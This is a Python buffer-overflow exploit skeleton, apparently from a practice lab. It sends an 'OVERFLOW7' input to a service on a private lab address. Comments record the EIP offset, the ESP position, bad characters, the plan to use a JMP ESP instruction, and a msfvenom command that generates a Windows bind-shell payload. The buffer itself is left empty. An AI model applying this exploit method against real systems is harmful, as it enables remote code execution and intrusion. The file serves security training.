import socket
import time


# Fuzzing shows crash at 1400 bytes input

host = "10.10.237.37"
port = 1337

pattern = bytearray("".encode("ascii"))
buffer = pattern

def sendExploit(host, port, buffer):
    prefix = bytearray("OVERFLOW7 ".encode("ascii"))
    suffix = bytearray("".encode("ascii"))

    exploitInput = prefix + buffer + suffix

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as csocket:
        csocket.connect((host, port))
        print("[+] Client connected.")

        print(f"[!] Data received from server: {csocket.recv(1024).decode('ascii')}")

        print("[+] Attempting to send exploit input...")
        csocket.send(exploitInput)


# Send data
sendExploit(host, port, buffer)


        
# Comments:

# EIP at crash: 72423572
# ESP at crash: 018CFA30 -> 37724236

# EIP Pattern Offset: 1306
# ESP (0x018cfa30) points at offset 1310

# ESP points inside of the pattern
# We can use `JMP ESP` instruction
# to jump to our exploit input

# Bad chars: 0x00, 0x8c, 0xae, 0xbe, 0xfb

# msfvenom -p windows/shell_bind_tcp -f c -a x86 --platform windows -b '\x00\x8c\xae\xbe\xfb'

# `JMP ESP` Addresses without Bad chars
